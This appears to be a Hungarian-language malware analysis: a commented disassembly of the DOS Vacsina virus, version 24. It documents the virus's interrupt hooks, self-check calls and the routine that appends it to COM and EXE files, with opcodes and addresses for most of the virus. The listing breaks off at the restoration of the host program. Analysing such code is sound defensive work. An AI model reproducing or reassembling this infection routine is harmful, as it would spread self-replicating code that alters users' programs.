

                           **************************
                           * Vacsina 24-es verzi¢ja *
                           **************************

A v°rus hossza 1760D-1775D byte.

A v°rus 32D byten†l hosszabb Çs 61559D byten†l rîvidebb COM Çs EXE,esetleg OV? f
						ileokat fertîz meg.
A file vÇgÇt paragrafushat†rra v†gja Çs odam†solja mag†t a lentebb l†that¢ form†
						ban. A file elejÇre
legyen az EXE vagy COM egy JMP utas°t†st °r, ami a belÇpÇsi pontra (038B) mutat.
						 Egy filet csak
egyszer fertîz meg. A kor†bbi verzi¢j£ Vacsin†kat kiîli. A fertîzîttsÇget a file
						 utols¢ 8 byteja
alapj†n dînti el. Ez alapj†n °rtja ki a kor†bbi verzi¢kat. ( HZVIR is ez alapj†n
						 °rt az alapos
ellenîrzÇsnÇl. Mi tîbb a Yankee Doodle is °r maga ut†n 8 ilyen byteot ( csak COM
						 filen†l), °gy az
is irthat¢ °gy. A HZVIR a Yankee Doodleokat mÇgis m†shogy °rtja!

A v°rus elsî beh°v†sakor egy gÇpen nîveli az INIC_SZ-t. Majd szaporod†skor m†r e
						zzel az ÇrtÇkkel
m†sol¢dik. Csak akkor zenÇl Ctrl-Alt-Del-nÇl a v°rus, ha INIC_SZ>=10D.
EgyÇb k†ros tevÇkenysÇge a v°rusnak nincs.

A ki°rt†shoz minden adat megtal†lhat¢ 06D8-t¢l.

V†ltoz†sok a Vacsina 16-os verzi¢j†hoz kÇpest:
- EXE filet m†r val¢ban fertîz.
- ZenÇl Ctrl-Alt-Del-nÇl.
- M†r meg†llap°tja a DOS val¢di belÇpÇsi pontj†t. EzÇrt h†l¢zatra m†r nem megy f
						el.
- M†r a C5xx DOS funkci¢val kÇrdezi le mag†t.
- A mem¢riale°r¢ blokkot m†r nem cipeli mag†val.


     ;---------------------------------------------------------------
     ;                          V†ltoz¢k
     ;---------------------------------------------------------------

0000 C_084D        DW   084D      ;Konstans. Ennyivel fogja a v°rus h†trÇbb pako
						lni a programot
0001               DB   0         ;Nem haszn†lt
0003 VIR_HOSSZ     DW   006D      ;V°rus hossza DIV 16
0004               DB   0C DUP 0  ;Nem haszn†lt
0010 TISZTA_INT21  DD   ?         ;A DOS val¢di belÇpÇsi pontja ha a lÇpÇsenkÇnt
						i vÇgrehajt†ssal
                                  ;meg tudja †llap°tani. EgyÇbkÇnt az INT 21 ere
						deti tartalma
0014 ERE_INT21     DD   ?         ;Az INT 21 eredeti c°me
0018 ERE_INT24     DD   ?         ;Az INT 24 eredeti c°me
001C ERE_INT09     DD   ?         ;Az INT 09 eredeti c°me
0020 F_ATTR        DW   ?         ;File attributtuma
0022 HANDLE        DW   ?         ;File handle
0024 F_DTTM        DD   ?         ;File d†tuma, ideje
0028 ERE_AX        DW   ?         ;ax eredeti ÇrtÇke (program futtat†s†n†l )
002A TRAP_FLAG     DB   ?         ;Ha ÇrtÇke 1 akkor engedÇlyezett a lÇpÇsenkÇnt
						i futtat†s
                                  ;Ha 0 akkor nem
002B VEZERLO       DB   1         ;Verzi¢sz†mokn†l j†tszik valamilyen szerepet.N
						em tudtam eldînteni
                                  ;hogy mit csin†l !!! Ha a 0. bitje 0 nem fertî
						z a v°rus.
002C INIC_SZ       DB   ?         ;Inicializ†l†sok sz†ma. Csak a ****-dik inicia
						liz†l†s ut†n zenÇl
002D BUFFER        DB   14 DUP (?);14 byte buffer. Ide olvassa be egy file ut¢ls
						¢ 8 bytej†t
                                  ;Ez alapj†n dînti el, hogy egy file fertîzîtt-
						e m†r.
                                  ;Ide olvassa be egy file elsî 14 bytej†t (EXE-
						nÇl ez a HEADER)
  ;FelÇp°tÇse (fertîzîtt filen†l):
     ;   002D      DW   ?         ;File eredeti hossza
     ;   002F      DW   ?         ;File eredeti 2.,3. byteja mint sz¢ + 0103 !
     ;   0031      DW   7AF4      ;Azonos°t¢ sz¢. Ez alapj†n ismeri fel, hogy fe
						rtîzîtt a file
     ;   0033      DB   18        ;Verzi¢sz†m
     ;   0034      DB   ?         ;9-esnÇl nagyobb verzi¢n†l a file eredeti elsî
						 byteja

  ;Itt †ll°tja elî az eredeti elsî 3 byteot is
     ;   002D      DB   ?         ;File eredeti elsî byteja lesz itt.
     ;   002E      DW   ?         ;Ide menti a file eredeti 2.,3. bytej†t j¢l ! 
						(Egy fertîzîtt
                                  ;file fertîtlen°tÇsekor
  ;EXE HEADERnÇl:
     ;   002D      DW   5A4D      ;EXE jelzî
     ;   002F      DW   ?         ;File hossz modulo 512
     ;   0031      DW   ?         ;File hossz 512-es lapokban
     ;   0033      DW   ?         ;Relok†ci¢s t†bla hossza
     ;   0035      DW   ?         ;Header hossza paragrafusokban
     ;   0037      DW   ?         ;Mem¢riaigÇny (min)
     ;   0039      DW   ?         ;Mem¢riaigÇny (max)


     ;---------------------------------------------------------------
     ;                       V†ltoz¢terÅlet vÇge
     ;---------------------------------------------------------------


     ;---------------------------------------------------------------
     ;            Egy hossz£ ugr†s az eredeti DOS-ra
     ;---------------------------------------------------------------

003B FF2E1000    * JMP	FAR [0010]          ;TISZTA_INT21 ÇrtÇke ekkor mÇg=ERE_IN
						T21-gyel


     ;---------------------------------------------------------------
     ;                       Tiszta INT 21 h°v†s
     ;---------------------------------------------------------------

003F 9C          * PUSHF
0040 FA            CLI
0041 2E            CS:
0042 FF1E1400      CALL	FAR [0014]
0046 C3            RET


     ;---------------------------------------------------------------
     ;              Directory bejegyzÇs aktualiz†l†sa
     ;---------------------------------------------------------------

0047 53            PUSH	BX
0048 50            PUSH	AX
0049 2E            CS:
004A 8B1E2200      MOV	BX,[0022]           ;HANDLE
004E B445          MOV	AH,45               ;DUPLICATE_FILE_HANDLE
0050 E8ECFF        CALL	003F                ;TINT 21
0053 7209          JB	005E                ;Hib†n†l CF-fel tÇr vissza
0055 8BD8          MOV	BX,AX               ;£j handle
0057 B43E          MOV	AH,3E               ;CLOSE_HANDLE
0059 E8E3FF        CALL	003F                ;TINT 21
005C EB01          JMP	005F                ;Hib†n†l CF-fel, egyÇbkÇnt NC-vel tÇr
						 vissza
005E F8          * CLC
005F 58          * POP	AX
0060 5B            POP	BX
0061 C3            RET


     ;---------------------------------------------------------------
     ;                 INT 24 (Dos kritikus hibakezelîje)
     ;---------------------------------------------------------------

0062 B003        * MOV	AL,03               ;Kritikus hib†n†l DOS hib†t gener†ljo
						n !
0064 CF            IRET


     ;---------------------------------------------------------------
     ;            INT 09 (BillentyÅzet hardware interruptja)
     ;---------------------------------------------------------------

     ; Ha a CTRL-ALT-DEL le van nyomva Çs INIC_SZ>=10D akkor zenÇl

0065 50          * PUSH	AX
0066 E460          IN	AL,60               ;Scan k¢d beolvas†sa
0068 3C53          CMP	AL,53               ;<Del> k¢dja
006A 752E          JNZ	009A                ;Ha nem ugr†s az eredeti rutinra
006C B402          MOV	AH,02               ;Shift st†tusz lekÇrdezÇse
006E CD16          INT	16
0070 240C          AND	AL,0C
0072 3C0C          CMP	AL,0C               ;Crtl-Alt
0074 7524          JNZ	009A                ;Ha nincs mind a kettî lenyomva ugr†s
0076 8CC8          MOV	AX,CS
0078 8ED8          MOV	DS,AX               ;Szegmensek be†ll°t†sa
007A 8ED0          MOV	SS,AX
007C BCFEFF        MOV	SP,FFFE
007F 2E            CS:
0080 803E2C000A    CMP	BYTE PTR [002C],0A  ;INIC_SZ
0085 7203          JB	008A                ;Ha 10D-nÇl kevesebbszer inicializ†l¢d
						ott a v°rus
0087 E89705        CALL	0621                ;ZenÇlj!
008A B80000        MOV	AX,0000
008D 8ED8          MOV	DS,AX
008F C70672043412  MOV	WORD PTR [0472],1234;Meleg reset jelzÇs
0095 EAF0FF00F0    JMP	F000:FFF0           ;REBOOT
009A 58          * POP	AX
009B 2E            CS:
009C FF2E1C00      JMP	FAR [001C]          ;ERE_INT09 eredeti rutin futtat†sa


     ;---------------------------------------------------------------
     ;                  INT 21  (Dos belÇpÇsi pontja)
     ;---------------------------------------------------------------
     ;                LefÅlelt DOS funkci¢k szÇtoszt†sa

00A0 9C          * PUSHF                    ;Megj.: tîk felesleges
00A1 3D004B        CMP	AX,4B00             ;EXECUTE
00A4 7461          JZ	0107
00A6 3D00C5        CMP	AX,C500             ;ax=18H, STC, IRET-et hajt vÇgre
00A9 7448          JZ	00F3
00AB 3D01C5        CMP	AX,C501             ;ah=0, al=[002B], STC, IRET-et hajt v
						Çgre
00AE 7448          JZ	00F8
00B0 3D02C5        CMP	AX,C502             ;[002B]=cl, STC, IRET-et hajt vÇgre
00B3 744B          JZ	0100
00B5 3D03C5        CMP	AX,C503             ;es:bx=TISZTA_INT21 Çs vmi egyÇb
00B8 740C          JZ	00C6
00BA 9D            POPF
00BB 2E            CS:
00BC FF2E1000      JMP	FAR [0010]          ;ERE_INT21 futtat†sa


     ;---------------------------------------------------------------
     ;             VisszatÇrÇs a C5xx alfunkci¢kn†l
     ;---------------------------------------------------------------

00C0 9D          * POPF
00C1 FB            STI
00C2 F9            STC                      ;JelzÇs, hogy a vacsina kÅld adatot
00C3 CA0200        RETF	0002                ;VisszatÇrÇs


     ;---------------------------------------------------------------
     ;                     C503 DOS alfunkci¢
     ;---------------------------------------------------------------
     ;  Be:  bx=h°v¢ vacsina verzi¢sz†ma
     ;  Ha nagyobb verzi¢j£ vacsina h°vta NC-vel tÇr vissza, egyebkÇnt CF-fel tÇ
						r vissza jelezvÇn
     ;  hogy a v°rus m†r a mem¢ri†ban van.

00C6 B81900      * MOV	AX,0019             ;Verzi¢sz†m+1
00C9 2E            CS:
00CA F6062B0002    TEST	BYTE PTR [002B],02  ;VEZERLO ???
00CF 7501          JNZ	00D2
00D1 48            DEC	AX
00D2 3BD8        * CMP	BX,AX
00D4 B000          MOV	AL,00               ;Megj.: Çrdekes, hogy a Yankee Doodle
						-ben itt hib†san
00D6 D0D0          RCL	AL,1                ;XOR AL,AL van, ami tîrli a carry-t
00D8 50            PUSH	AX                  ;ax-ben 0 vagy 1
00D9 B81800        MOV	AX,0018
00DC 2E            CS:
00DD F6062B0004    TEST	BYTE PTR [002B],04  ;VEZERLO ???
00E2 7501          JNZ	00E5
00E4 40            INC	AX
00E5 3BD8        * CMP	BX,AX               ;Ha nagyobb verzi¢j£ vacsina h°vta NC
						-vel tÇr vissza
00E7 2E            CS:
00E8 C41E1400      LES	BX,[0014]           ;es:bx=ERE_INT21
00EC 58            POP	AX
00ED 44            INC	SP                  ;popf-et helyettes°ti
00EE 44            INC	SP
00EF FB            STI
00F0 CA0200        RETF	0002

     ;---------------------------------------------------------------
     ;                     C500 DOS alfunkci¢
     ;---------------------------------------------------------------

00F3 B81800      * MOV	AX,0018
00F6 EBC8          JMP	00C0                ;VisszatÇrÇs CF-fel


     ;---------------------------------------------------------------
     ;                     C501 DOS alfunkci¢
     ;---------------------------------------------------------------

00F8 2E          * CS:
00F9 A02B00        MOV	AL,[002B]           ;Nem tudom pontosan mit jelent!
00FC B400          MOV	AH,00
00FE EBC0          JMP	00C0                ;VisszatÇrÇs CF-fel


     ;---------------------------------------------------------------
     ;                     C502 DOS alfunkci¢
     ;---------------------------------------------------------------

0100 2E          * CS:
0101 880E2B00      MOV	[002B],CL           ;[002B] be†ll°t†sa (nem tudom mit jel
						ent)
0105 EBB9          JMP	00C0                ;VisszatÇrÇs Cf-gel


     ;---------------------------------------------------------------
     ;                 LefÅlelt DOS 4B00 alfunkci¢
     ;---------------------------------------------------------------
     ;     INT 24 (DOS kritikus hibakezelîje) lekÇrdezÇre †t°r†sa

0107 06          * PUSH	ES                  ;bp+10
0108 1E            PUSH	DS                  ;bp+0E
0109 55            PUSH	BP                  ;bp+0C
010A 57            PUSH	DI                  ;bp+0A
010B 56            PUSH	SI                  ;bp+08
010C 52            PUSH	DX                  ;bp+06
010D 51            PUSH	CX                  ;bp+04
010E 53            PUSH	BX                  ;bp+02
010F 50            PUSH	AX                  ;bp+00
0110 8BEC          MOV	BP,SP
0112 B82435        MOV	AX,3524             ;GET_INT_VECT (es:bx)
0115 E827FF        CALL	003F                ;Tiszta int 21 h°v†s (a tov†bbiakban
						 TINT 21)
0118 2E            CS:
0119 8C061A00      MOV	[001A],ES           ;ERE_INT24 szegmense
011D 2E            CS:
011E 891E1800      MOV	[0018],BX           ;ERE_INT24 offsetje
0122 0E            PUSH	CS
0123 1F            POP	DS                  ;ds=cs
0124 BA6200        MOV	DX,0062
0127 B82425        MOV	AX,2524             ;SET_INT_VECT (ds:dx)
012A E812FF        CALL	003F                ;TINT 21


     ;ds:dx †ltal mutatott nevÅ file attributtum†nak lekÇrdezÇse, Çs R/O tîrlÇse

012D B80043        MOV	AX,4300             ;GET_FILE_ATTR (cx)
0130 8E5E0E        MOV	DS,[BP+0E]          ;eredeti ds
0133 8B5606        MOV	DX,[BP+06]          ;eredeti dx
0136 E806FF        CALL	003F                ;TINT 21
0139 7303          JNB	013E                ;Ha nincs hiba (lÇtezik a file)
013B E93302        JMP	0371                ;Hib†n†l INT 24 vissza†ll°t†sa, erede
						ti DOS h°v†s
013E 2E          * CS:
013F 890E2000      MOV	[0020],CX           ;F_ATTR
0143 B80143        MOV	AX,4301             ;SET_FILE_ATTR (cx)
0146 80E1FE        AND	CL,FE               ;R/O bit tîrlÇse
0149 E8F3FE        CALL	003F                ;TINT 21
014C 7303          JNB	0151                ;Ha nincs hiba
014E E92002        JMP	0371                ;Hib†n†l INT 24 vissza†ll°t†sa, erede
						ti DOS h°v†s


     ;                 File megnyit†sa °r†sra, olvas†sra

0151 B8023D      * MOV	AX,3D02             ;OPEN_HANDLE (ax) °r†sra,olvas†sra
0154 8E5E0E        MOV	DS,[BP+0E]          ;eredeti ds
0157 8B5606        MOV	DX,[BP+06]          ;eredeti dx
015A E8E2FE        CALL	003F                ;TINT 21
015D 7303          JNB	0162                ;Ha nincs hiba
015F E9FE01        JMP	0360                ;Hib†n†l INT 24,F_ATTR vissza†ll°t†sa
						, eredeti DOS
0162 2E          * CS:
0163 A32200        MOV	[0022],AX           ;HANDLE
0166 8BD8          MOV	BX,AX


     ;                    File idejÇnek lekÇrdezÇse

0168 B80057        MOV	AX,5700             ;GET_FILE_DTTM (cx:dx)
016B E8D1FE        CALL	003F                ;TINT 21
016E 2E            CS:
016F 890E2400      MOV	[0024],CX           ;F_DTTM  (time)
0173 2E            CS:
0174 89162600      MOV	[0026],DX           ;F_DTTM+2 (date)


     ;A file utols¢ 8 bytej†nak beolvas†sa a BUFFER-be, Çs a fertîzîttsÇg vizsg†
						lata

0178 0E            PUSH	CS
0179 1F            POP	DS                  ;ds=cs
017A B80242      * MOV	AX,4202             ;File pointer a file vÇge-8-dik poz°c
						i¢ra
017D B9FFFF        MOV	CX,FFFF
0180 BAF8FF        MOV	DX,FFF8
0183 8B1E2200      MOV	BX,[0022]           ;HANDLE
0187 E8B5FE        CALL	003F                ;TINT 21
018A 7221          JB	01AD                ;Hib†n†l INT 24, F_ATTR, F_DTTM vissza
						†ll°t†sa, CLOSE
018C 8B1E2200      MOV	BX,[0022]           ;HANDLE
0190 BA2D00        MOV	DX,002D             ;BUFFER c°me ds:dx-ben
0193 B90800        MOV	CX,0008             ;8 byte olvas†sa
0196 B43F          MOV	AH,3F               ;READ_HANDLE (bx,cx,ds:dx)
0198 E8A4FE        CALL	003F                ;TINT 21
019B 7210          JB	01AD                ;Hib†n†l INT 24, F_ATTR, F_DTTM vissza
						†ll°t†sa, CLOSE
019D 3D0800        CMP	AX,0008             ;Beolvasta-e mind a 8 byteot?
01A0 750B          JNZ	01AD                ;Hib†n†l INT 24, F_ATTR, F_DTTM vissz
						a†ll°t†sa, CLOSE
01A2 813E3100F47A  CMP	WORD PTR [0031],7AF4;Fertîzîtt-e a file?
01A8 7406          JZ	01B0                ;Ha fertîzîtt ugr†s
01AA E98C00        JMP	0239                ;Lehet megfertîzni a filet


     ;  SegÇdugr†s hib†n†l ( INT 24, F_ATTR, F_DTTM vissza†ll°t†sa, CLOSE )

01AD E99601      * JMP	0346


     ;---------------------------------------------------------------
     ;            A file m†r fertîzîtt Vacsina v°russal
     ;---------------------------------------------------------------
     ;                  Milyen verzi¢j£ v°rus?

01B0 B418        * MOV	AH,18
01B2 F6062B0002    TEST	BYTE PTR [002B],02 ;VEZERLO ???
01B7 7402          JZ	01BB
01B9 FEC4          INC	AH
01BB 38263300    * CMP	[0033],AH          ;A fileban lÇvî v°rus verzi¢ja
01BF 73EC          JNB	01AD               ;Ha egyezik vagy nagyobb-> nem fertîzÅ
						nk


     ;      Egy fertîzîtt fileb¢l a szÅksÇges inform†ci¢k kivÇtele

01C1 8A0E3400      MOV	CL,[0034]          ;9-esnÇl nagyobb verzi¢n†l a file ered
						eti elsî byteja
01C5 A12D00        MOV	AX,[002D]          ;File eredeti hossza
01C8 A3D806        MOV	[06D8],AX          ;ERE_HOSSZ
01CB A12F00        MOV	AX,[002F]          ;File eredeti 2.,3. byteja mint sz¢ + 
						0103 !
01CE A3DA06        MOV	[06DA],AX          ;ERE_2_3
01D1 2D0301        SUB	AX,0103            ;Val¢di eredeti 2.,3. byte
01D4 A32E00        MOV	[002E],AX          ;Elt†rolja
01D7 803E330009    CMP	BYTE PTR [0033],09
01DC 7702          JA	01E0               ;9-es verzi¢n†l nagyobb?
01DE B1E9          MOV	CL,E9              ;EgyÇbkÇnt az elsî byte egy JMP k¢dja
01E0 880E2D00    * MOV	[002D],CL          ;Elt†rolja
01E4 880EDF06      MOV	[06DF],CL          ;ERE_1


     ;         Egy fertîzîtt fileb¢l a rÇgebbi vacsina ki°rt†sa
     ;              Az eredeti elsî 3 byte vissza†ll°t†sa:

01E8 B80042        MOV	AX,4200            ;MOVE_FILE_POINTER (cx:dx)
01EB B90000        MOV	CX,0000            ;File elejÇre †ll†s
01EE BA0000        MOV	DX,0000
01F1 8B1E2200      MOV	BX,[0022]          ;HANDLE
01F5 E847FE        CALL	003F               ;TINT 21
01F8 72B3          JB	01AD               ;Hib†n†l
01FA B440          MOV	AH,40              ;WRITE_HANDLE (bx,cx,ds:ds)
01FC BA2D00        MOV	DX,002D
01FF B90300        MOV	CX,0003
0202 E83AFE        CALL	003F               ;TINT 21
0205 72A6          JB	01AD               ;Hib†n†l
0207 3D0300        CMP	AX,0003            ;Ki°rta-e mind a 3 byteot?
020A 75A1          JNZ	01AD               ;Hib†n†l
020C E838FE        CALL	0047               ;Directory bejegyzÇs aktualiz†l†sa
020F 729C          JB	01AD               ;Hib†n†l


     ;                  File mÇretre v†g†sa:

0211 B80042        MOV	AX,4200            ;MOVE_FILE_POINTER (cx:dx)
0214 B90000        MOV	CX,0000
0217 8B16D806      MOV	DX,[06D8]          ;ERE_HOSSZ
021B 8B1E2200      MOV	BX,[0022]          ;HANDLE
021F E81DFE        CALL	003F               ;TINT 21
0222 7289          JB	01AD               ;Hib†n†l
0224 B440          MOV	AH,40              ;WRITE_HANDLE
0226 B90000        MOV	CX,0000            ;Csonkol†s
0229 E813FE        CALL	003F               ;TINT 21
022C 7208          JB	0236               ;Hib†n†l
022E E816FE        CALL	0047               ;Directory bejegyzÇs aktualiz†l†sa
0231 7203          JB	0236               ;Hib†n†l
0233 E944FF        JMP	017A               ;KÇsz: le°rtottuk a v°rust, de h†tha v
						an mÇg egy


     ;  SegÇdugr†s hib†n†l ( INT 24, F_ATTR, F_DTTM vissza†ll°t†sa, CLOSE )

0236 E90D01      * JMP	0346


     ;---------------------------------------------------------------
     ;         A file mÇg/m†r nem fertîzîtt, lehet megfertîzni
     ;---------------------------------------------------------------
     ;       Csak akkor fertîz, ha [002B] and 1 = 1 !!!

0239 F6062B0001  * TEST	BYTE PTR [002B],01  ;VEZERLO
023E 74F6          JZ	0236                ;Nem fertîz !!!


     ;    Csak akkor fertîzi a filet, ha  32 < hossz < 61559

0240 B80242        MOV	AX,4202             ;MOVE_FILE_POINTER (cx:dx)
0243 B90000        MOV	CX,0000
0246 8BD1          MOV	DX,CX               ;File vÇgÇre †ll†s
0248 8B1E2200      MOV	BX,[0022]           ;HANDLE
024C E8F0FD        CALL	003F                ;TINT 21
024F 72E5          JB	0236                ;Hib†n†l
0251 83FA00        CMP	DX,+00              ;dx:ax-ben a file hossza
0254 75E0          JNZ	0236                ;Nagyobb mint 64K->nem fertîzzÅk
0256 3D2000        CMP	AX,0020
0259 76DB          JBE	0236                ;Ha 32D byten†l kisebb vagy egyenlî
025B 3D77F0        CMP	AX,F077
025E 90            NOP                      ;Megj.: Ez a NOP minek van itt?
025F 73D5          JNB	0236                ;Ha 61559 byten†l hosszabb vagy egyen
						lî
0261 A3D806        MOV	[06D8],AX           ;ERE_HOSSZ


     ;                    File eljÇre †ll

0264 B80042        MOV	AX,4200             ;MOVE_FILE_POINTER (cx:dx)
0267 B90000        MOV	CX,0000
026A 8BD1          MOV	DX,CX               ;File elejÇre †ll
026C 8B1E2200      MOV	BX,[0022]           ;HANDLE
0270 E8CCFD        CALL	003F                ;TINT 21
0273 72C1          JB	0236                ;Hib†n†l


     ;           A BUFFERbe a file elsî 14D bytej†nak beolvas†sa

0275 BA2D00        MOV	DX,002D             ;BUFFER
0278 B90E00        MOV	CX,000E
027B B43F          MOV	AH,3F               ;READ_HANDLE (bx,cx,ds:dx)
027D E8BFFD        CALL	003F                ;TINT 21
0280 72B4          JB	0236                ;Hib†n†l
0282 3D0E00        CMP	AX,000E
0285 75AF          JNZ	0236                ;Hib†n†l
0287 813E2D004D5A  CMP	WORD PTR [002D],5A4D
028D 740B          JZ	029A                ;Ugr†s, ha EXE
028F 813E2D005A4D  CMP	WORD PTR [002D],4D5A
0295 7403          JZ	029A
0297 EB15          JMP	02AE                ;COM filen†l
0299 90            NOP


     ;     EXE file megfertîzÇse (nem fertîzzÅk meg, ha hib†s a header)

029A 833E3900FF  * CMP	WORD PTR [0039],-01 ;Mem¢riaigÇny (max)
029F 7595          JNZ	0236                ;Ha nem FFFF nem fertîzzÅk (miÇrt ?)
02A1 A13100        MOV	AX,[0031]           ;File hossz 512-es lapokban
02A4 B109          MOV	CL,09
02A6 D3E0          SHL	AX,CL               ;*512
02A8 3B06D806      CMP	AX,[06D8]           ;Stimmel-e a hossz?
02AC 7288          JB	0236                ;Ha nem nem fertîzÅnk


     ;            File megfertîzÇse (EXE-bîl is COM-ot csin†l)
     ;                    Elsî 3 byte megîrzÇse

02AE A12E00      * MOV	AX,[002E]           ;File 2.,3. byteja
02B1 050301        ADD	AX,0103             ;+ 0103 !!!
02B4 A3DA06        MOV	[06DA],AX           ;ERE_2_3
02B7 A02D00        MOV	AL,[002D]           ;File 1. byteja
02BA A2DF06        MOV	[06DF],AL           ;ERE_1


     ;               Filehossz kerk°tÇse paragrafushat†rra

02BD B80042        MOV	AX,4200             ;MOVE_FILE_POINTER
02C0 B90000        MOV	CX,0000
02C3 8B16D806      MOV	DX,[06D8]           ;ERE_HOSSZ
02C7 83C20F        ADD	DX,+0F
02CA 83E2F0        AND	DX,-10              ;Filehossz kerek°tÇse
02CD 8B1E2200      MOV	BX,[0022]           ;HANDLE
02D1 E86BFD        CALL	003F                ;TINT 21
02D4 7303          JNB	02D9
02D6 EB6E        * JMP	0346                ;Hib†n†l
02D8 90            NOP


     ;              A v°rus hozz†°rja mag†t a filehoz

02D9 8B1E2200    * MOV	BX,[0022]           ;HANDLE
02DD 8CCA          MOV	DX,CS               ;???
02DF BA0000        MOV	DX,0000
02E2 B9E006        MOV	CX,06E0             ;V°rus hossza
02E5 B440          MOV	AH,40               ;WRITE_HANDLE
02E7 FF362B00      PUSH	[002B]              ;Megîrzi (VEZERLO)
02EB C6062B0001    MOV	BYTE PTR [002B],01  ;fertîzî pÇld†ny jelzÇs
02F0 E84CFD        CALL	003F                ;TINT 21
02F3 5A            POP	DX
02F4 88162B00      MOV	[002B],DL           ;Vissza†ll°tja
02F8 72DC          JB	02D6                ;Hib†n†l
02FA 3DE006        CMP	AX,06E0             ;Ki°rta-e mind a 06E0 byteot
02FD 75D7          JNZ	02D6                ;Hib†n†l
02FF E845FD        CALL	0047                ;Directory bejegyzÇs aktualiz†l†sa
0302 72D2          JB	02D6                ;Hib†n†l


     ;      A file leendî elsî 3 bytej†nak elî†ll°t†sa a BUFFER-ben

0304 C6062D00E9    MOV	BYTE PTR [002D],E9  ;JMP k¢dja
0309 2E            CS:
030A 8B16D806      MOV	DX,[06D8]           ;ERE_HOSSZ
030E 83C20F        ADD	DX,+0F
0311 83E2F0        AND	DX,-10              ;Kerek°tÇs
0314 83EA03        SUB	DX,+03              ;-3 a JMP miatt
0317 81C28B03      ADD	DX,038B             ;+ a belÇpÇsi pont offsetje a v°ruson
						 belÅl
031B 89162E00      MOV	[002E],DX           ;JMP operandusa


     ;                     Az elsî 3 byte †t°r†sa

031F B80042        MOV	AX,4200             ;MOVE_FILE_POINTER (cx:dx)
0322 B90000        MOV	CX,0000
0325 8BD1          MOV	DX,CX               ;File elejÇre †ll†s
0327 8B1E2200      MOV	BX,[0022]           ;HANDLE
032B E811FD        CALL	003F                ;TINT 21
032E 72A6          JB	02D6                ;Hib†n†l
0330 8B1E2200      MOV	BX,[0022]           ;HANDLE
0334 BA2D00        MOV	DX,002D             ;BUFFER
0337 B90300        MOV	CX,0003             ;3 byte
033A B440          MOV	AH,40               ;WRITE_HANDLE (bx,cx,ds:dx)
033C E800FD        CALL	003F                ;TINT 21
033F 7295          JB	02D6                ;Hib†n†l
0341 3D0300        CMP	AX,0003
0344 7590          JNZ	02D6                ;Hib†n†l


     ;          File d†tum†nak vissza†ll°t†sa, lez†r†s

0346 2E          * CS:
0347 8B1E2200      MOV	BX,[0022]           ;HANDLE
034B 2E            CS:
034C 8B0E2400      MOV	CX,[0024]           ;F_DTTM (time)
0350 2E            CS:
0351 8B162600      MOV	DX,[0026]           ;F_DTTM+2 (date)
0355 B80157        MOV	AX,5701             ;SET_FILE_DTTM (cx:dx)
0358 E8E4FC        CALL	003F                ;TINT 21
035B B43E          MOV	AH,3E               ;CLOSE_HANDLE (bx)
035D E8DFFC        CALL	003F                ;TINT 21


     ;          File eredeti attributtum†nak vissza†ll°t†sa

0360 B80143      * MOV	AX,4301             ;SET_FILE_ATTR
0363 8E5E0E        MOV	DS,[BP+0E]          ;eredeti ds
0366 8B5606        MOV	DX,[BP+06]          ;eredeti dx
0369 2E            CS:
036A 8B0E2000      MOV	CX,[0020]           ;F_ATTR
036E E8CEFC        CALL	003F                ;TINT 21


     ;         Eredeti INT 24 vissza°r†sa, eredeti DOS h°v†sa

0371 B82425      * MOV	AX,2524             ;SET_INT_VECT (ds:dx)
0374 2E            CS:
0375 C5161800      LDS	DX,[0018]           ;ERE_INT24
0379 E8C3FC        CALL	003F                ;TINT 21
037C 58            POP	AX
037D 5B            POP	BX
037E 59            POP	CX
037F 5A            POP	DX
0380 5E            POP	SI
0381 5F            POP	DI
0382 5D            POP	BP
0383 1F            POP	DS
0384 07            POP	ES
0385 9D            POPF
0386 2E            CS:
0387 FF2E1000      JMP  FAR [0010]          ;ERE_INT21


     ;---------------------------------------------------------------
     ;                           BelÇpÇsi pont
     ;---------------------------------------------------------------

038B E80000      * CALL 038E
038E 5B          * POP  BX                  ;***  BX=038E  ***
038F 2E            CS:
0390 89879AFC      MOV  [BX+FC9A],AX        ;ERE_AX (0028) ax mentÇse
0394 2E            CS:
0395 FE879EFC      INC  BYTE PTR [BX+FC9E]  ;INIC_SZ (002C) inicializ†l†sok sz†m
						†nak nîvelÇs


     ;                          ônlekÇrdezÇs

0399 53            PUSH BX                  ;bx=038E
039A BB1800        MOV  BX,0018             ;bx=24D (verzi¢sz†m)
039D F8            CLC
039E B803C5        MOV  AX,C503             ;ônlekÇrdezÇs. CF-fel tÇr vissza, ha
						 akt°v
03A1 CD21          INT  21                  ;Megj.:Novell if CF-et ad vissza, az
						t hiszem
03A3 5B            POP  BX                  ;bx=038E
03A4 7227          JB   03CD                ;Ugr†s, ha m†r akt°v az redeti progr
						am futtat†s†ra


     ;            A v°rus h†trÇbb m†solja mag†t ([0000]+1 paragrafussal)

03A6 83FCF0        CMP  SP,-10
03A9 7222          JB   03CD                ;Ha sp<FFF0 akkor nincs elÇg szabad 
						mem¢ria
03AB 2E            CS:
03AC 8B9775FC      MOV  DX,[BX+FC75]        ;C_084D (0000) konstans
03B0 42            INC  DX
03B1 8CD9          MOV  CX,DS
03B3 03D1          ADD  DX,CX
03B5 8EC2          MOV  ES,DX               ;ES=DS+084E
03B7 8BF3          MOV  SI,BX               ;bx=038E
03B9 81C672FC      ADD  SI,FC72             ;si=0000 (v°rus kezdete)
03BD 8BFE          MOV  DI,SI
03BF B9E006        MOV  CX,06E0             ;v°rus hossza
03C2 FC            CLD
03C3 F3            REPZ
03C4 A4            MOVSB


     ;              A vezÇrlÇs †tkerÅl a m†solat v°rusra

03C5 06            PUSH ES
03C6 E80300        CALL 03CC
03C9 E9B300        JMP  047F                ;ES:047F-en folytat¢dik a vÇgrehajt†
						s
03CC CB          * RETF


     ;---------------------------------------------------------------
     ;                  Az eredeti program futtat†sa
     ;---------------------------------------------------------------
     ;             Vissza†ll°tja az eredeti elsî 3 byteot

03CD 8CC8        * MOV  AX,CS               ;£j_cs
03CF 8ED8          MOV  DS,AX
03D1 8EC0          MOV  ES,AX
03D3 8ED0          MOV  SS,AX
03D5 83C402        ADD  SP,+02
03D8 B80000        MOV  AX,0000             ;A stacken 0000-nak kell lennie, hog
						y egy sima ret
03DB 50            PUSH AX                  ;a DOS-ba tÇrjen vissza !
03DC 2E            CS:
03DD 8A875103      MOV  AL,[BX+0351]        ;ERE_1 (06DF) A file eredeti 1. byte
						ja
03E1 2E            CS:
03E2 A20001        MOV  [0100],AL           ;Vissza†ll°t†s
03E5 2E            CS:
03E6 8B879AFC      MOV  AX,[BX+FC9A]        ;ERE_AX (0028) ax eredeti ÇrtÇke
03EA 2E            CS:
